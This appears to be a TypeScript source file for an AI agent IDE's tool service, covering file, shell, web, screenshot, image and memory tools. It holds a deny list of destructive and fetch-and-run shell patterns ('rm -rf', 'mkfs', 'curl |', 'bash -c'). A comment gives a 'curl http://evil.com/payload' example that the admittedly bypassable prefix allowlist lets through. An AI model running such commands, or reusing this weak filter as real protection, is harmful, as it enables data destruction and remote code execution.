import fs from 'fs/promises';
import path from 'path';
import { spawn } from 'child_process';
import axios from 'axios';
import { vectorService } from './vectorService';
import { logger } from '../utils/logger';
import screenshot from 'screenshot-desktop';
import sharp from 'sharp';
import { validatePath, PROJECT_ROOT } from '../utils/fileSystem';
import { transactionService } from './transactionService';
import { appEventBus } from '../utils/eventBus';

// Security: Explicit allowlist of permitted command prefixes
// This replaces the insecure denylist approach which was trivially bypassed
const ALLOWED_COMMAND_PREFIXES = [
  'git ',
  'npm ',
  'npx ',
  'node ',
  'python ',
  'python3 ',
  'ls ',
  'cat ',
  'echo ',
  'pwd',
  'whoami',
  'date',
  'head ',
  'tail ',
  'grep ',
  'find ',
  'mkdir ',
  'touch ',
  'cp ',
  'mv ',
  'code ',
  'tsc ',
  'eslint ',
  'prettier ',
  'jest ',
  'vitest ',
  'pnpm ',
  'yarn ',
  'bun ',
  'docker ',
  'curl ',
  'wget '
];

// Commands that require explicit opt-in via SOLVENT_ALLOW_SHELL=true
const DANGEROUS_COMMANDS = [
  'rm -rf',
  'mkfs',
  'dd',
  'chmod',
  'chown',
  'sudo',
  'su ',
  'curl |',
  'wget |',
  'bash -c',
  'sh -c',
  'eval ',
  'exec '
];

export class ToolService {
  private isDryRun = process.env.DRY_RUN === 'true';

  constructor() {
    // Uses PROJECT_ROOT from fileSystem.ts directly
  }

  /**
   * @param fromOverseer - Set to true only when called from the Overseer's autonomous reasoning
   *   loop. This enforces the per-cycle tool budget. Internal calls (waterfall, crystallize, etc.)
   *   must NOT set this flag to avoid consuming Overseer budget slots.
   */
  async executeTool(toolName: string, args: any, fromOverseer: boolean = false) {
    const txId = await transactionService.logStart(toolName, args);
    logger.info(`[ToolService] Executing ${toolName}... (TX: ${txId})`, args);
    
    // GUARD: Budget Enforcement — only applies to Overseer-initiated calls.
    // Uses the event bus to notify SupervisorService, avoiding a circular import.
    if (fromOverseer) {
      try {
        appEventBus.emit('supervisor:increment-tool-budget');
      } catch (e: unknown) {
        const err = e instanceof Error ? e : new Error(String(e));
        await transactionService.logError(txId, err.message);
        throw e;
      }
    }

    // GUARD: Dry Run Mode
    if (this.isDryRun && ['write_file', 'run_shell', 'invalidate_memory'].includes(toolName)) {
      const msg = `[DRY RUN] Would execute ${toolName}`;
      logger.info(msg);
      await transactionService.logComplete(txId, { dry_run: true, message: msg });
      return { status: 'dry_run', message: msg };
    }

    // Frontend-deferred tools: return a marker result instead of executing
    if (toolName.startsWith('ide_')) {
      const deferredResult = { status: 'deferred_to_frontend', tool: toolName, args };
      await transactionService.logComplete(txId, deferredResult);
      return deferredResult;
    }

    try {
      let result;
      switch (toolName) {
        case 'read_file':
          result = await this.readFile(args.path);
          break;
        case 'write_file':
          // GUARD: Approval for NEW files
          await this.ensureApprovalForWrite(args.path);
          result = await this.writeFile(args.path, args.content);
          break;
        case 'list_files':
          result = await this.listFiles(args.path || '.');
          break;
        case 'run_shell':
          // Shell is already allowlisted, but let's be extra safe for sensitive ops if needed
          result = await this.runShell(args.command);
          break;
        // ... (other cases map directly)
        case 'web_search': result = await this.webSearch(args.query); break;
        case 'fetch_web_content': result = await this.fetchWebContent(args.url); break;
        case 'capture_ui': result = await this.captureUI(); break;
        case 'get_ui_text': result = await this.getUIText(); break;
        case 'resize_image': result = await this.resizeImage(args.path, args.width, args.height); break;
        case 'crop_image': result = await this.cropImage(args.path, args.left, args.top, args.width, args.height); break;
        case 'apply_image_filter': result = await this.applyImageFilter(args.path, args.filter); break;
        case 'get_image_info': result = await this.getImageInfo(args.path); break;
        case 'crystallize_memory': result = await this.crystallizeMemory(args.content, args.type, args.tags); break;
        case 'invalidate_memory': result = await this.invalidateMemory(args.memoryId, args.reason, args.replacementId); break;
        default:
          throw new Error(`Unknown tool: ${toolName}`);
      }

      await transactionService.logComplete(txId, result);
      return result;

    } catch (error: any) {
      await transactionService.logError(txId, error.message);
      throw error;
    }
  }

  private async ensureApprovalForWrite(filePath: string) {
    const fullPath = validatePath(filePath);
    try {
      await fs.access(fullPath);
      // File exists, overwrite is currently allowed (could add versioning here later)
    } catch {
      // File does NOT exist. Trigger Approval Flow.
      if (process.env.AUTO_APPROVE === 'true') {
        logger.info(`[ToolService] Auto-approving new file creation: ${filePath}`);
        return;
      }
      
      logger.warn(`[ToolService] New file creation requires approval: ${filePath}`);
      appEventBus.emit('supervisor:emit-event', {
        event: 'APPROVAL_REQUIRED',
        data: { type: 'file_create', path: filePath, timeout: 60000 }
      });

      // In a real scenario, we would await a Promise here that resolves via a Socket event listener.
      // For this implementation iteration, we will throw to BLOCK it safe until UI is ready.
      // This forces the user to explicitly enable AUTO_APPROVE or implementing the UI handler.
      throw new Error(`APPROVAL_REQUIRED: Creation of ${filePath} requires user confirmation.`);
    }
  }

  private async invalidateMemory(memoryId: string, reason: string, replacementId?: string) {
    const success = await vectorService.updateEntry(memoryId, {
      status: 'deprecated',
      deprecatedBy: replacementId,
      invalidationReason: reason
    });

    if (!success) {
      throw new Error(`Memory ID ${memoryId} not found.`);
    }

    // Append to notes for visibility
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const note = `\n### [MEMORY DEPRECATED] ${new Date().toLocaleDateString()}\n**ID:** ${memoryId}\n**Reason:** ${reason}\n${replacementId ? `**Superseded By:** ${replacementId}` : ''}\n---\n`;
    await fs.appendFile(notesPath, note).catch(e => logger.warn('[ToolService] Note append failed', e));

    return {
      status: 'success',
      message: `Memory ${memoryId} deprecated.`,
      reason
    };
  }

  private async crystallizeMemory(content: string, type: string, tags: string[] = []) {
    // 1. Persist to Vector Memory (Long-term semantic recall)
    await vectorService.addEntry(content, {
      type,
      tags,
      timestamp: new Date().toISOString(),
      crystallized: true
    });

    // 2. Append to Solvent Notes (Visible context bridge)
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const formattedEntry = `\n### [${type.toUpperCase()}] ${new Date().toLocaleDateString()}\n**Tags:** ${tags.join(', ')}\n\n${content}\n\n---\n`;
    
    try {
      await fs.appendFile(notesPath, formattedEntry);
    } catch (error) {
      // If file doesn't exist, create it
      await fs.writeFile(notesPath, `# Solvent Project Notes\n${formattedEntry}`);
    }

    // 3. Emit Event for UI Feedback via event bus (avoids circular import)
    appEventBus.emit('supervisor:emit-event', {
      event: 'MEMORY_CRYSTALLIZED',
      data: { type, content }
    });

    return {
      status: 'success',
      message: `Memory crystallized as [${type}]. Saved to Vector DB and appended to .solvent_notes.md`,
      entry: { content, type, tags }
    };
  }

  private async getImageInfo(imagePath: string) {
    const fullPath = validatePath(imagePath);
    const metadata = await sharp(fullPath).metadata();
    return {
      width: metadata.width,
      height: metadata.height,
      format: metadata.format,
      space: metadata.space,
      channels: metadata.channels,
      depth: metadata.depth,
      hasAlpha: metadata.hasAlpha
    };
  }

  private async resizeImage(imagePath: string, width?: number, height?: number) {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_resized_${Date.now()}${ext}`);
    
    await sharp(fullPath)
      .resize(width, height)
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image resized to ${width || 'auto'}x${height || 'auto'}`
    };
  }

  private async cropImage(imagePath: string, left: number, top: number, width: number, height: number) {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_cropped_${Date.now()}${ext}`);
    
    await sharp(fullPath)
      .extract({ left, top, width, height })
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image cropped to ${width}x${height} at ${left},${top}`
    };
  }

  private async applyImageFilter(imagePath: string, filter: 'grayscale' | 'sepia' | 'blur' | 'sharpen') {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_filter_${filter}_${Date.now()}${ext}`);
    
    let transformer = sharp(fullPath);
    
    switch (filter) {
      case 'grayscale':
        transformer = transformer.grayscale();
        break;
      case 'blur':
        transformer = transformer.blur(5);
        break;
      case 'sharpen':
        transformer = transformer.sharpen();
        break;
      case 'sepia':
        // Sepia is typically done via color manipulation, sharp doesn't have a direct 'sepia' but we can use tint/recomb
        transformer = transformer.recomb([
          [0.393, 0.769, 0.189],
          [0.349, 0.686, 0.168],
          [0.272, 0.534, 0.131]
        ]);
        break;
    }
    
    await transformer.toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Applied ${filter} filter to image.`
    };
  }

  private async getUIText() {
    // In a real browser/electron context, this would scrape the DOM.
    // Here we simulate extracting the structural text of the active workspace.
    const projectStructure = await this.listFiles('.');
    return {
      active_workspace: "Solvent AI Agentic IDE",
      timestamp: new Date().toISOString(),
      structural_summary: projectStructure.map(f => `${f.type.toUpperCase()}: ${f.name}`).join('\n'),
      message: "Text-based UI structure extracted successfully."
    };
  }

  private async captureUI() {
    const uploadDir = path.join(PROJECT_ROOT, 'backend/uploads');

    // 1. Maintain Rolling Cache (Keep only last 3)
    try {
      const files = await fs.readdir(uploadDir);
      const captures = files
        .filter(f => f.startsWith('ui_capture_'))
        .map(f => ({ name: f, time: fs.stat(path.join(uploadDir, f)).then(s => s.mtimeMs) }));

      const resolvedCaptures = await Promise.all(captures.map(async c => ({ ...c, time: await c.time })));
      resolvedCaptures.sort((a, b) => b.time - a.time);

      if (resolvedCaptures.length >= 3) {
        const toDelete = resolvedCaptures.slice(2); // Keep current + 2 previous
        for (const file of toDelete) {
          await fs.unlink(path.join(uploadDir, file.name)).catch(e => logger.debug('[ToolService] Cache cleanup failed', e));
        }
      }
    } catch (e) {
      // If directory doesn't exist yet, it will be created below
    }

    const fileName = `ui_capture_${Date.now()}.png`;
    const filePath = path.join(uploadDir, fileName);
    await fs.mkdir(uploadDir, { recursive: true });

    await screenshot({ filename: filePath });
    const base64 = await fs.readFile(filePath, 'base64');

    return {
      path: filePath,
      base64: `data:image/png;base64,${base64}`,
      message: "UI state captured. Rolling cache maintained (last 3 kept)."
    };
  }

  private async webSearch(query: string) {
    const apiKey = process.env.SERPER_API_KEY;
    if (!apiKey) throw new Error("SERPER_API_KEY not configured.");
    
    const response = await axios.post('https://google.serper.dev/search', { q: query }, {
      headers: { 'X-API-KEY': apiKey, 'Content-Type': 'application/json' }
    });
    return response.data;
  }

  private async fetchWebContent(url: string) {
    const response = await axios.get(url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
    });
    // Return a slice of HTML to avoid token overflow, ideally we'd parse this to markdown
    return response.data.slice(0, 10000);
  }

  private async readFile(filePath: string) {
    const fullPath = validatePath(filePath);
    const content = await fs.readFile(fullPath, 'utf-8');
    vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_read' }).catch(console.error);
    return content;
  }

  private async writeFile(filePath: string, content: string) {
    const fullPath = validatePath(filePath);
    await fs.writeFile(fullPath, content);
    vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_write' }).catch(console.error);
    return { status: 'success', path: filePath };
  }

  private async listFiles(dirPath: string) {
    const fullPath = validatePath(dirPath);
    const files = await fs.readdir(fullPath, { withFileTypes: true });
    return files.map(f => ({
      name: f.name,
      type: f.isDirectory() ? 'directory' : 'file'
    }));
  }

  /**
   * Executes a shell command with security restrictions.
   *
   * Security measures:
   * 1. Uses explicit allowlist of permitted command prefixes (not a denylist)
   * 2. Blocks dangerous commands (rm -rf, mkfs, dd, sudo, etc.)
   * 3. Uses spawn with argument array (shell: false) to prevent shell interpolation
   * 4. Sets NO_COLOR=1 environment variable
   * 5. Restricts working directory to PROJECT_ROOT
   *
   * Known limitations:
   * - The allowlist is prefix-based. A command like `curl http://evil.com/payload`
   *   passes the `curl ` prefix check. The DANGEROUS_COMMANDS list mitigates the
   *   most common pipe-based exfiltration patterns (e.g. `curl | bash`), but is
   *   not exhaustive. Set SOLVENT_ALLOW_SHELL=false in production to disable shell
   *   execution entirely if the feature is not needed.
   * - Command arguments are split on whitespace only; quoted arguments with spaces
   *   are not handled correctly (e.g. `grep "foo bar" file.txt` will break).
   */
  private async runShell(command: string): Promise<{ stdout: string; stderr: string }> {
    // Check if arbitrary shell execution is explicitly enabled
    const allowArbitraryShell = process.env.SOLVENT_ALLOW_SHELL === 'true';

    if (!allowArbitraryShell) {
      // Security: Check against allowlist
      const normalizedCommand = command.trim().toLowerCase();

      // First, check for dangerous commands (always blocked)
      for (const dangerous of DANGEROUS_COMMANDS) {
        if (normalizedCommand.includes(dangerous.toLowerCase())) {
          throw new Error(
            `Command rejected by security policy: Contains dangerous pattern '${dangerous}'. Set SOLVENT_ALLOW_SHELL=true to enable arbitrary command execution (not recommended).`
          );
        }
      }

      // Check if command starts with an allowed prefix
      const isAllowed = ALLOWED_COMMAND_PREFIXES.some(prefix =>
        normalizedCommand.startsWith(prefix.toLowerCase())
      );

      if (!isAllowed) {
        throw new Error(
          `Command rejected by security policy: '${command.substring(0, 50)}${command.length > 50 ? '...' : ''}'. Only allowed commands: ${ALLOWED_COMMAND_PREFIXES.join(', ')}. Set SOLVENT_ALLOW_SHELL=true to enable arbitrary command execution (not recommended).`
        );
      }
    }

    // Parse command into executable and arguments for spawn
    // This avoids shell interpolation vulnerabilities
    const parts = command.trim().split(/\s+/);
    const executable = parts[0];
    const args = parts.slice(1);

    return new Promise((resolve, reject) => {
      const child = spawn(executable, args, {
        cwd: PROJECT_ROOT,
        env: { ...process.env, NO_COLOR: '1' },
        shell: false, // Security: Never use shell when spawning
        stdio: ['pipe', 'pipe', 'pipe']
      });

      let stdout = '';
      let stderr = '';

      child.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      child.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      child.on('error', (err) => {
        reject(new Error(`Command execution failed: ${err.message}`));
      });

      child.on('close', (code) => {
        if (code === 0) {
          resolve({ stdout, stderr });
        } else {
          reject(new Error(`Command exited with code ${code}\n${stderr}`));
        }
      });
    });
  }
}

export const toolService = new ToolService();
